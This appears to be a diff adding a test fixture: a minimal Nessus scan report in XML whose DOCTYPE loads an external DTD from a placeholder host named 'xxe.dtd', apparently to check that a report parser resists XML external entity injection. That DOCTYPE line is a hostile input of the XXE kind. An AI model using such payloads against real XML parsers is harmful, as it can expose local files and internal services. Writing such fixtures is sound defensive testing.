@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE nessus_clientdata SYSTEM "http://example.invalid/xxe.dtd">
+<NessusClientData_v2>
+  <Report name="hostile">
+    <ReportHost name="127.0.0.1">
+      <HostProperties></HostProperties>
+    </ReportHost>
+  </Report>
+</NessusClientData_v2>
